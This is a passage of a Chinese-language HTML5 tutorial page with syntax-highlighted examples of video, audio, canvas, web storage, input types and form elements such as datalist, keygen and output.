punctuation">"</span>video/mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     Your browser does not support the video tag.     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="属性列表"><a href="#属性列表" class="headerlink" title="属性列表"></a>属性列表</h3><table><thead><tr><th align="left">属性</th><th align="center">值</th><th align="right">描述</th></tr></thead><tbody><tr><td align="left">autoplay</td><td align="center">autoplay</td><td align="right">如果出现该属性，则视频在就绪后马上播放</td></tr><tr><td align="left">controls</td><td align="center">controls</td><td align="right">如果出现该属性，则向用户显示控件，比如播放按钮</td></tr><tr><td align="left">height</td><td align="center">pixels</td><td align="right">设置视频播放器的高度</td></tr><tr><td align="left">loop</td><td align="center">loop</td><td align="right">如果出现该属性，则当媒介文件完成播放后再次开始播放</td></tr><tr><td align="left">preload</td><td align="center">preload</td><td align="right">如果出现该属性，则视频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性</td></tr><tr><td align="left">src</td><td align="center">url</td><td align="right">要播放的视频的 URL</td></tr><tr><td align="left">width</td><td align="center">pixels</td><td align="right">设置视频播放器的宽度</td></tr></tbody></table><h2 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class="line-numbers language-html"><code class="language-html">  &lt;video src="file:///G:/%E6%A1%8C%E9%9D%A2/1.mp4" width="320"height="240"controls="control">    your brwser does not support the video tag  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>支持多个source文件以浏览器可识别的第一个文件使用</li></ul><h3 id="属性列表-1"><a href="#属性列表-1" class="headerlink" title="属性列表"></a>属性列表</h3><table><thead><tr><th align="left">属性</th><th align="center">值</th><th align="right">描述</th></tr></thead><tbody><tr><td align="left">autoplay</td><td align="center">autoplay</td><td align="right">如果出现该属性，则音频在就绪后马上播放</td></tr><tr><td align="left">controls</td><td align="center">controls</td><td align="right">如果出现该属性，则向用户显示控件，比如播放按钮</td></tr><tr><td align="left">loop</td><td align="center">loop</td><td align="right">如果出现该属性，则每当音频结束时重新开始播放</td></tr><tr><td align="left">preload</td><td align="center">preload</td><td align="right">如果出现该属性，则音频在页面加载时进行加载，并预备播放。 如果使用 “autoplay”，则忽略该属性</td></tr><tr><td align="left">src</td><td align="center">url</td><td align="right">要播放的音频的 URL</td></tr></tbody></table><h2 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h2><h3 id="用途简介"><a href="#用途简介" class="headerlink" title="用途简介"></a>用途简介</h3><ul><li><p>canvas实际上只是提供一个画框,画图有JavaScript完成  </p></li><li><p>画布为矩形区域，可以控制每一个像素  </p></li><li><p>元素创建<br><code>&lt;canvas id=&quot;myCanvas&quot; width=&quot;180&quot; height=&quot;180&quot; style=&quot;border: 1px solid #CA5355&quot;&gt;&lt;/canvas&gt;</code>  </p></li><li><p>通过JavaScrip来绘制  </p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">  <script type="text/javascript">     var c=document.getElementById("myCanvas");  //寻找指定canvas    var cxt=c.getContext("2d"); //内建HTML5的对象,内置多种绘图方法    // 绘制红色矩形    cxt.fillStyle="#FF0000";     cxt.fillRect(0,0,150,75);     </script>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><a href="http://www.w3school.com.cn/tags/html_ref_canvas.asp" target="_blank" rel="noopener">参考手册</a>  </p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3></li><li><p>画三角  </p><pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvas<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     Your browser does not support the canvas element.   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">lineTo</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">lineTo</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="web存储"><a href="#web存储" class="headerlink" title="web存储"></a>web存储</h2><h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><ul><li>没有时间限制，第二天，下一年数据依然可用  </li><li>实例  <pre class="line-numbers language-html"><code class="language-html">  <span class="token comment" spellcheck="true">&lt;!--创建与访问--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">         localStorage<span class="token punctuation">.</span>lastname<span class="token operator">=</span><span class="token string">"Smith"</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"Last name:"</span> <span class="token operator">+</span> localStorage<span class="token punctuation">.</span>lastname<span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--记录访问次数--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">if</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>pagecount<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            localStorage<span class="token punctuation">.</span>pagecount<span class="token operator">=</span><span class="token function">Number</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>pagecount<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>        <span class="token keyword">else</span>             <span class="token punctuation">{</span>                 localStorage<span class="token punctuation">.</span>pagecount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"Visits "</span><span class="token operator">+</span> localStorage<span class="token punctuation">.</span>pagecount <span class="token operator">+</span> <span class="token string">" time(s)."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h3><ul><li>针对也个seeion的数据储存,关闭界面后数据消失  </li><li>实例  <pre class="line-numbers language-html"><code class="language-html">  <span class="token comment" spellcheck="true">&lt;!--创建与访问--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        sessionStorage<span class="token punctuation">.</span>lastname<span class="token operator">=</span><span class="token string">"Tom"</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"Last name:"</span> <span class="token operator">+</span> sessionStorage<span class="token punctuation">.</span>lastname<span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--记录访问次数--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">if</span><span class="token punctuation">(</span>sessionStorage<span class="token punctuation">.</span>pagecount<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                sessionStorage<span class="token punctuation">.</span>pagecount<span class="token operator">=</span><span class="token function">Number</span><span class="token punctuation">(</span>sessionStorage<span class="token punctuation">.</span>pagecount<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token keyword">else</span>             <span class="token punctuation">{</span>                 sessionStorage<span class="token punctuation">.</span>pagecount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"Visits "</span><span class="token operator">+</span> sessionStorage<span class="token punctuation">.</span>pagecount <span class="token operator">+</span> <span class="token string">" time(s)."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="input类型"><a href="#input类型" class="headerlink" title="input类型"></a>input类型</h2><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><ul><li><code>action</code>后面接提交的地址  </li><li><code>method</code>方法为<code>get</code>  </li><li><code>type</code>后接提交类型  </li></ul><h3 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h3><ul><li><p>提交数字  </p><pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>points<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">step</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提交日期  </p><pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     Date: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_date<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     Date and time: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>datetime<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_date<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提交网址  </p><pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     Homepage: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_url<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提交邮件  </p><pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     E-mail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_email<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提交搜索  </p><pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Points: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>范围内选择提交  </p><pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Points: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>range<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>points<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h2><h3 id="datalist"><a href="#datalist" class="headerlink" title="datalist"></a>datalist</h3><ul><li>datalist元素规定输入域的所选列表  </li><li>列表通过option元素创建  </li><li>指定输入域的id  </li><li>option 元素永远都要设置 value 属性  </li><li>简单码源  <pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         WebPage:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url_list<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>datalist</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url_list<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>W3School<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3school.com.cn<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Google<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.google.com<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Microsoft<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.microsoft.com<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>datalist</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="keygen"><a href="#keygen" class="headerlink" title="keygen"></a>keygen</h3><ul><li>验证用户登录  </li><li>是密钥对生成器,提交表单时生成一个私钥一个公钥  </li><li>私钥存于客户端,公钥发送到服务器.公钥用于之后验证客户端证书  </li><li>不幸的是浏览器对此元素的支持度非常欠缺  </li><li>简单源码  <pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        Username: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>usr_name<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        Encryption: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>keygen</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>security<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="output"><a href="#output" class="headerlink" title="output"></a>output</h3><ul><li>作为计算结果输出显示  </li><li>for 规定一个或多个元素的 id 列表，以空格分隔。这些元素描述了计算中使用的元素与计算结果之间的关系  </li><li>form 规定 <output> 元素所属的一个或多个表单的 id 列表，以空格分隔  </output></li><li>name 规定 <output> 元素的名称  </output></li><li>简单码源  <pre class="line-numbers language-html"><code class="language-html">  <span class="token 